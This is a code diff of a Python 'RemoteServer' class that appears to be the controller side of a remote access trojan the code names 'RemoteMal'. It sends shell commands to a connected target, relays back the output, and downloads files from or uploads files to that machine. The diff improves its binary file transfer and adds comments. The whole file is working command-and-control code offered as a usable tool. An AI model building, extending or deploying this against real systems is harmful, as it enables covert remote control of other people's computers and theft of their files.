@@ -3,16 +3,18 @@ import os
 import sys
 from Load import *
 import time
+import struct 
 
 class RemoteServer(object):
     
-    def __init__(self,Ip,PortId,CharSet="utf-32",Buffering=1024):
-       self.Ip=Ip                   #Ipv4 Address Where  The Socket Server Need To Run
-       self.PortId=PortId           #Port ID of the Socket Server Need To Run
-       self.Address=(Ip,PortId)     #Address Where The Socket Sever Need To Run
-       self.CharSet=CharSet         #Character Set For Encoding And Decoding
-       self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
-       self.RecvBuffer = list()     #Buffer used to handle the combined data
+    def __init__(self,Ip,PortId,CharSet="utf-32",Buffering=1024,file_transfer_buffer=1024):
+       self.Ip=Ip                                       #Ipv4 Address Where  The Socket Server Need To Run
+       self.PortId=PortId                               #Port ID of the Socket Server Need To Run
+       self.Address=(Ip,PortId)                         #Address Where The Socket Sever Need To Run
+       self.CharSet=CharSet                             #Character Set For Encoding And Decoding
+       self.Buffering=Buffering                         #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
+       self.RecvBuffer = list()                         #Buffer used to handle the combined data
+       self.file_transfer_buffer = file_transfer_buffer #Buffer used to transfer binary files
     
     def BindServer(self):
         #Bind the serevr at the specified port
@@ -35,165 +37,303 @@ class RemoteServer(object):
         print("\x1b[33m_\x1b[0m"*150)
         return None
 
-    def send(self,data):
-        #Send data as chunks 
+    
+    def send_size(self, size):
+        # Pack the size as a big-endian unsigned long long (8 bytes)
+        packed_size = struct.pack('>Q', size)
+        
+        # Pad with zeros if less than 8 bytes
+        padded_size = packed_size.ljust(8, b'\x00')  # Ensure it’s exactly 8 bytes
+        
+        # Send the padded size
+        self.client_socket.sendall(padded_size)
+
+
+    def recv_size(self):
+        # Receive exactly 8 bytes
+        size_bytes = self.client_socket.recv(8)
+            
+        # Unpack the 8-byte buffer to get the size
+        size = struct.unpack('>Q', size_bytes)[0]
+
+        return size
+
+
+    def send(self, data):
+        # Append a null character to the data
         null_added_data = self.AppendNull(data)
-        for i in range(0,len(null_added_data),self.Buffering):
-            chunk =null_added_data[i:i+self.Buffering]
+        
+        # Iterate over the data in chunks defined by self.Buffering
+        for i in range(0, len(null_added_data), self.Buffering):
+            # Extract a chunk of data
+            chunk = null_added_data[i:i+self.Buffering]
+            
+            # Send the chunk to the client socket encoded with the specified character set
             self.client_socket.send(chunk.encode(self.CharSet)) 
 
         return None
 
+
     def recv(self):
+        # Initialize an empty string to store received data
         data = ""
         flag = True
 
+        # Check if there are items in the dequeue; if not, proceed to receive data
         dequeue = self.DequeueHandler()
-        if(not dequeue):
+        if not dequeue:
             while flag:
+                # Receive a chunk of data from the client socket and decode it
                 chunk = self.client_socket.recv(self.Buffering).decode(self.CharSet)
 
-                if(len(chunk) >=  1):
-                    if(chunk[-1] == '\0'):
+                # Check if the received chunk has at least one character
+                if len(chunk) >= 1:
+                    # If the last character is a null character, set flag to False to exit the loop
+                    if chunk[-1] == '\0':
                         flag = False
+                
+                # Append the received chunk to the data string
                 data += chunk
-        
+            
+            # Split the received data by null characters and pass it to the EnqueueHandler
             return self.EnqueueHandler(data.split('\0')) 
-        return dequeue        
+        
+        # Return the result of DequeueHandler if there were items to dequeue
+        return dequeue
+    
 
-    def bin_send(self,bin_data):
-        #Send data as chunks 
-        null_added_data = self.bin_AppendNUll(bin_data)
-        for i in range(0,len(null_added_data),self.Buffering):
-            chunk =null_added_data[i:i+self.Buffering]
+
+    def bin_send(self, bin_data):
+        # Iterate through the binary data in chunks of size defined by file_transfer_buffer
+        for i in range(0, len(bin_data), self.file_transfer_buffer):
+            # Extract a chunk of binary data
+            chunk = bin_data[i:i+self.file_transfer_buffer]
+            # Send the chunk through the client socket
             self.client_socket.send(chunk) 
+        
+        # Return None after sending all chunks
         return None
 
+
     def bin_recv(self):
-        bin_data = b""
-        flag = True
+        # Receive the total file size from the client
+        file_size = self.recv_size()
+        
+        # Calculate the number of chunks to receive based on the file size and buffer size
+        num_of_chunks = (file_size + self.file_transfer_buffer - 1) // self.file_transfer_buffer
 
-        while flag:
-            chunk = self.client_socket.recv(self.Buffering)
-            if(len(chunk) >=  1):
-                if(chunk[-1] == 0):
-                    flag = False
+        # Iterate through the number of chunks and yield each received chunk
+        for _ in range(num_of_chunks):
+            # Receive a chunk of data from the client socket
+            chunk = self.client_socket.recv(self.file_transfer_buffer)
+            # Yield the received chunk for processing
+            yield chunk
 
-            bin_data += chunk
-        return bin_data
-             
 
-    def EnqueueHandler(self,next_data):
+    def EnqueueHandler(self, next_data):
+        # Iterate through the incoming data
         for data in next_data:
-            if(not data):
+            # Skip any empty data entries
+            if not data:
                 continue
+            # Append non-empty data to the receive buffer
             self.RecvBuffer.append(data)
+        
+        # Call and return the result of the DequeueHandler to process the buffer
         return self.DequeueHandler()
 
     def DequeueHandler(self):
-        if(len(self.RecvBuffer) != 0):
-            return self.ByteOrderMark(self.RecvBuffer.pop(0)).replace('\\x00','\x00')
+        # Check if the receive buffer is not empty
+        if len(self.RecvBuffer) != 0:
+            # Remove the BOM (Byte Order Mark) from the front of the buffer
+            # and replace the escaped null characters with actual null characters
+            return self.remove_bom(self.RecvBuffer.pop(0)).replace('\\x00', '\x00')
+        
+        # Return None if the buffer is empty
         return None
 
-    def ByteOrderMark(self,data):
+
+    def remove_bom(self, data):
         try:
-            return data.replace('\ufeff','') #Remove BOM charcter if it exists.
+            # Remove the BOM (Byte Order Mark) character if it exists in the data
+            return data.replace('\ufeff', '')
         except:
+            # Return the original data if an exception occurs
             return data
 
-    def DownloadTextFile(self,file_path):
+
+    def DownloadTextFile(self, file_path):
+        # Check if the file exists on the server
         is_file_exist = self.recv()
-        if(is_file_exist == "True"):
+        if (is_file_exist == "True"):
+            # Prompt user for download path and file name
             dld_path = input("\x1b[0;32m>>>Enter Download path:\x1b[0m")
             file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
-            if(os.path.exists(dld_path)):
-                self.send("True")
-                with open(dld_path+'/'+file_name,mode='w') as file:
-                    file_content = self.recv()
-                    if (not file_content):
+            
+            # Check if the specified download path exists
+            if os.path.exists(dld_path):
+                self.send("True")  # Notify the server that the path is valid
+                
+                # Open the specified file for writing
+                with open(dld_path + '/' + file_name, mode='w') as file:
+                    file_content = self.recv()  # Receive the file content from the server
+                    
+                    # Write the content to the file, handling empty content case
+                    if not file_content:
                         file.write('')
                     else:
                         file.write(file_content)
+                        
+                # Inform the user that the file was downloaded successfully
                 print(f"\x1b[0;32m [+] {file_name} Downloaded Successfully\x1b[0m")
-
             else:
-                self.send("False")
+                self.send("False")  # Notify the server that the path does not exist
                 print(f"\x1b[0;31m The download path {dld_path} doesn't exist\x1b[0m")
-
         else:
+            # Inform the user that the target file path does not exist
             print(f"\x1b[0;31m The target path {file_path} doesn't exist\x1b[0m")
 
-    def DownloadedBinaryFile(self,file_path):
+
+    def DownloadedBinaryFile(self, file_path):
+        # Check if the binary file exists on the server
         is_file_exist = self.recv()
-        if(is_file_exist == "True"):
+        if (is_file_exist == "True"):
+            # Prompt user for download path and file name
             dld_path = input("\x1b[0;32m>>>Enter Download path:\x1b[0m")
             file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
-            if(os.path.exists(dld_path)):
-                self.send("True")
-                with open(dld_path+'/'+file_name,mode='wb') as file:
-                    file_content = self.bin_recv()
-                    if (not file_content):
-                        file.write('')
-                    else:
-                        file.write(file_content)
-                print(f"\x1b[0;32m [+] {file_name} Downloaded Successfully\x1b[0m")
+            
+            # Check if the specified download path exists
+            if os.path.exists(dld_path):
+                self.send("True")  # Notify the server that the path is valid
+                
+                try:
+                    # Open the specified file for binary writing with a defined buffer size
+                    with open(dld_path + '/' + file_name, mode='wb', buffering=self.file_transfer_buffer) as file:
+                        file_content = self.bin_recv()  # Receive the binary file content in chunks
+                        
+                        for chunk in file_content:
+                            # Raise an error if a null byte is received, indicating permission denial
+                            if (chunk == b'\x00'):
+                                raise PermissionError("\n\x1b[0;31m Permission denied by the target [!] \x1b[0m\n")
+
+                            # Raise an error for the string representation of a null byte
+                            elif (chunk == b'\\x00'):
+                                raise OSError(f"\n\x1b[0;31m While Downloading File: {file_name} an error occurred \x1b[0m\n")
+                            else:
+                                file.write(chunk)  # Write the received chunk to the file
+
+                except PermissionError as Perror:
+                    print(str(Perror))  # Handle permission errors
+
+                except OSError as oserror:
+                    print(str(oserror))  # Handle other OS-related errors
+
+                else:
+                    # Inform the user that the binary file was downloaded successfully
+                    print(f"\n\x1b[0;32m [+] {file_name} Downloaded Successfully\x1b[0m\n")
 
             else:
-                self.send("False")
-                print(f"\x1b[0;31m The download path {dld_path} doesn't exist\x1b[0m")
+                self.send("False")  # Notify the server that the path does not exist
+                print(f"\n\x1b[0;31m The download path {dld_path} doesn't exist\x1b[0m\n")
 
         else:
-            print(f"\x1b[0;31m The target path {file_path} doesn't exist\x1b[0m")
+            # Inform the user that the target file path does not exist
+            print(f"\n\x1b[0;31m The target path {file_path} doesn't exist\x1b[0m\n")
 
-    def UploadTextFile(self,file_path):
+
+    def UploadTextFile(self, file_path):
+        # Check if the specified file exists on the client side
         is_file_exist = os.path.exists(file_path)
-        if(is_file_exist):
-            self.send("True")
+        if (is_file_exist):
+            self.send("True")  # Notify the server that the file exists
+            
+            # Prompt the user for the upload destination path on the server
             upld_path = input("\x1b[0;32m>>>Enter Upload path:\x1b[0m")
-            self.send(upld_path)
+            self.send(upld_path)  # Send the upload path to the server
+            
+            # Prompt the user for the file name to be used on the server
             file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
-            self.send(file_name)
-        
+            self.send(file_name)  # Send the file name to the server
+            
+            # Check if the specified upload path exists on the server
             is_upld_path_exist = self.recv()
-            if(is_upld_path_exist == "True"):
-                with open(file_path,mode='r') as file:
-                    file_content = file.read()
-                    self.send(file_content)
+            if (is_upld_path_exist == "True"):
+                # Open the file in read mode and send its content to the server
+                with open(file_path, mode='r') as file:
+                    file_content = file.read()  # Read the entire file content
+                    self.send(file_content)  # Send the file content to the server
+                
+                # Wait for a response from the server indicating the write operation result
                 write_operation = self.recv()
-                if(write_operation == "True"):
+                if (write_operation == "True"):
+                    # Inform the user that the file was uploaded successfully
                     print(f"\x1b[0;32m [^] {file_name} Uploaded Successfully\x1b[0m")
 
             else:
+                # Inform the user that the specified upload path does not exist
                 print(f"\x1b[0;31m The upload path {upld_path} doesn't exist\x1b[0m")
 
         else:
-            self.send("False")
-            print(f"\x1b[0;31m The  path {file_path} doesn't exist\x1b[0m")
+            self.send("False")  # Notify the server that the file does not exist
+            print(f"\x1b[0;31m The path {file_path} doesn't exist\x1b[0m")
 
-    def UploadBinaryFile(self,file_path):
+    def UploadBinaryFile(self, file_path):
+        # Check if the specified binary file exists on the client side
         is_file_exist = os.path.exists(file_path)
-        if(is_file_exist):
-            self.send("True")
+        if (is_file_exist):
+            self.send("True")  # Notify the server that the file exists
+            
+            # Prompt the user for the upload destination path on the server
             upld_path = input("\x1b[0;32m>>>Enter Upload path:\x1b[0m")
-            self.send(upld_path)
+            self.send(upld_path)  # Send the upload path to the server
+            
+            # Prompt the user for the file name to be used on the server
             file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
-            self.send(file_name)
-        
+            self.send(file_name)  # Send the file name to the server
+            
+            # Check if the specified upload path exists on the server
             is_upld_path_exist = self.recv()
-            if(is_upld_path_exist == "True"):
-                with open(file_path,mode='rb') as file:
-                    file_content = file.read()
-                    self.bin_send(file_content)
-                write_operation = self.recv()
-                if(write_operation == "True"):
-                    print(f"\x1b[0;32m [^] {file_name} Uploaded Successfully\x1b[0m")
+            if (is_upld_path_exist == "True"):
+                try:
+                    # Open the binary file in read mode with specified buffering
+                    with open(file_path, mode='rb', buffering=self.file_transfer_buffer) as file:
+                        file_size = os.path.getsize(file_path)  # Get the size of the file
+                        self.send_size(file_size)  # Send the file size to the server
+                        
+                        while True:
+                            # Read chunks of the file based on the buffer size
+                            file_chunk = file.read(self.file_transfer_buffer)
+
+                            if (not file_chunk):
+                                break  # Exit loop if there are no more chunks to read
+
+                            self.bin_send(file_chunk)  # Send the binary chunk to the server
+
+                except PermissionError as perror:
+                    # Handle permission errors by notifying the server and sending a specific error signal
+                    self.send_size(1)
+                    self.bin_send(b'\x00')
+
+                except OSError as oserror:
+                    # Handle other OS-related errors by notifying the server and sending a different error signal
+                    self.send_size(1)
+                    self.bin_send(b'\\x00')
+
+                else:
+                    # Wait for a response from the server indicating the write operation result
+                    write_operation = self.recv()
+                    if (write_operation == "True"):
+                        # Inform the user that the file was uploaded successfully
+                        print(f"\x1b[0;32m [^] {file_name} Uploaded Successfully\x1b[0m")
 
             else:
+                # Inform the user that the specified upload path does not exist
                 print(f"\x1b[0;31m The upload path {upld_path} doesn't exist\x1b[0m")
 
         else:
-            self.send("False")
-            print(f"\x1b[0;31m The  path {file_path} doesn't exist\x1b[0m")
+            self.send("False")  # Notify the server that the file does not exist
+            print(f"\x1b[0;31m The path {file_path} doesn't exist\x1b[0m")
+
 
     def GetBuffer(self,flag=False):
         while(flag):
@@ -229,11 +369,11 @@ class RemoteServer(object):
         return None
 
     def AppendNull(self, data):
-        data = data.replace('\x00','\\x00')
-        return data + '\0'
-
-    def bin_AppendNUll(self,bin_data):
-        return bin_data + b'\0'
+        # Replace all null characters with the escape sequence '\x00'
+        data = data.replace('\x00', '\\x00')  
+        
+        # Append a null character at the end of the modified data
+        return data + '\0'  
 
 
     def Partitions(self):
@@ -442,41 +582,66 @@ class RemoteServer(object):
                         self.WinPathConfig(cmd)
                         self.VerifyPath()
 
-                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split())>=3):
-                    option = cmd.split()[1]
-                    file_path = cmd[len("remotemal-dld -t "):].replace("\\","/")
-                    if(option == '-t'):
+                # Check if the command is for downloading a file using RemoteMal
+                elif (cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split()) >= 3):
+                    option = cmd.split()[1]  # Extract the option (either -t for text or -b for binary)
+                    
+                    # Extract the file path from the command, replacing backslashes with forward slashes
+                    file_path = cmd[len("remotemal-dld -t "):].replace("\\", "/")
+                    
+                    # Handle text file download
+                    if (option == '-t'):
                         self.DownloadTextFile(file_path)
-                    elif(option == '-b'):
+                        
+                    # Handle binary file download
+                    elif (option == '-b'):
                         self.DownloadedBinaryFile(file_path)
+                        
                     else:
-                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-dld\x1b[0m\n\n")
+                        # Inform the user of an invalid option for the download command
+                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-dld\x1b[0m\n\n")
 
-                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split())>=3):
-                    option = cmd.split()[1]
-                    file_path = cmd[len("remotemal-upld -t "):].replace("\\","/")
-                    if(option == '-t'):
+                # Check if the command is for uploading a file using RemoteMal
+                elif (cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split()) >= 3):
+                    option = cmd.split()[1]  # Extract the option (either -t for text or -b for binary)
+                    
+                    # Extract the file path from the command, replacing backslashes with forward slashes
+                    file_path = cmd[len("remotemal-upld -t "):].replace("\\", "/")
+                    
+                    # Handle text file upload
+                    if (option == '-t'):
                         self.UploadTextFile(file_path)
-                    elif(option == '-b'):
+                        
+                    # Handle binary file upload
+                    elif (option == '-b'):
                         self.UploadBinaryFile(file_path)
+                        
                     else:
-                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-upld\x1b[0m\n\n")
+                        # Inform the user of an invalid option for the upload command
+                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-upld\x1b[0m\n\n")
+
 
                 elif(cmd.lower()=="remotequit"):
                     self.close() #Close the socket connection.
 
 
                 else:
-                    #Recieve the output for the command execution
-                    self.Getstdin()
-                    flag=self.recv()
+                    # Receive the output for the command execution
+                    self.Getstdin()  # Call a method to get standard input for command execution
 
-                    if(flag == "Yes"):
+                    # Receive a flag indicating the success of the command execution
+                    flag = self.recv()
+
+                    # Check if the command execution resulted in an error
+                    if (flag == "Yes"):
+                        # Receive and print the error output (stderr)
                         stderr = self.recv()
-                        print(f"\n\x1b[0;31m{stderr}\x1b[0m\n")
+                        print(f"\n\x1b[0;31m{stderr}\x1b[0m\n")  # Print error output in red
                     else:
+                        # Receive and print the standard output (stdout)
                         stdout = self.recv()
-                        print(f"\n\x1b[0;32m{stdout}\x1b[0m\n")
+                        print(f"\n\x1b[0;32m{stdout}\x1b[0m\n")  # Print standard output in green
+
              
 
 
@@ -508,40 +673,44 @@ class RemoteServer(object):
                         self.VerifyPath()
 
 
-                elif(cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split())>=3):
-                    option = cmd.split()[1]
-                    file_path = cmd[len("remotemal-dld -t ") :].replace("\\","/")
-                    if(option == '-t'):
-                        self.DownloadTextFile(file_path)
-                    elif(option == '-b'):
-                        self.DownloadedBinaryFile(file_path)
+                # Check if the command is to download a file
+                elif (cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split()) >= 3):
+                    option = cmd.split()[1]  # Get the download option (-t or -b)
+                    file_path = cmd[len("remotemal-dld -t ") :].replace("\\", "/")  # Extract and format the file path
+                    if (option == '-t'):
+                        self.DownloadTextFile(file_path)  # Call method to download a text file
+                    elif (option == '-b'):
+                        self.DownloadedBinaryFile(file_path)  # Call method to download a binary file
                     else:
-                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-dld\x1b[0m\n\n")
+                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-dld\x1b[0m\n\n")  # Invalid option error message
 
-                elif(cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split())>=3):
-                    option = cmd.split()[1]
-                    file_path = cmd[len("remotemal-upld -t ") :].replace("\\","/")
-                    if(option == '-t'):
-                        self.UploadTextFile(file_path)
-                    elif(option == '-b'):
-                        self.UploadBinaryFile(file_path)
+                # Check if the command is to upload a file
+                elif (cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split()) >= 3):
+                    option = cmd.split()[1]  # Get the upload option (-t or -b)
+                    file_path = cmd[len("remotemal-upld -t ") :].replace("\\", "/")  # Extract and format the file path
+                    if (option == '-t'):
+                        self.UploadTextFile(file_path)  # Call method to upload a text file
+                    elif (option == '-b'):
+                        self.UploadBinaryFile(file_path)  # Call method to upload a binary file
                     else:
-                        print(f"\n\x1b[0;31mInvalid Optoin:{option} for remotemal-upld\x1b[0m\n\n")
+                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-upld\x1b[0m\n\n")  # Invalid option error message
 
-                elif(cmd.lower()=="remotequit"):
-                    self.close() #Close the socket connection.
+                # Check if the command is to quit the remote session
+                elif (cmd.lower() == "remotequit"):
+                    self.close()  # Close the socket connection.
 
                 else:
-                    #Recieve the output for the command execution
-                    self.Getstdin()
-                    flag=self.recv()
+                    # Receive the output for the command execution
+                    self.Getstdin()  # Get standard input for the command
+                    flag = self.recv()  # Receive a flag indicating the success of the command execution
 
-                    if(flag == "Yes"):
-                        stderr = self.recv()
-                        print(f"\n\n\x1b[0;31m{stderr}\x1b[0m\n\n")
+                    if (flag == "Yes"):
+                        stderr = self.recv()  # Receive and print the error output (stderr)
+                        print(f"\n\n\x1b[0;31m{stderr}\x1b[0m\n\n")  # Print error output in red
                     else:
-                        stdout = self.recv()
-                        print(f"\n\n\x1b[0;32m{stdout}\x1b[0m\n\n")
+                        stdout = self.recv()  # Receive and print the standard output (stdout)
+                        print(f"\n\n\x1b[0;32m{stdout}\x1b[0m\n\n")  # Print standard output in green
+
                     
 
 
@@ -555,7 +724,7 @@ class RemoteServer(object):
 
 
 if __name__=="__main__":
-    r=RemoteServer("127.0.0.1",5066)
+    r=RemoteServer("127.0.0.1",5136)
     r.Banner()
     r.BindServer()
     r.SetBuffer()
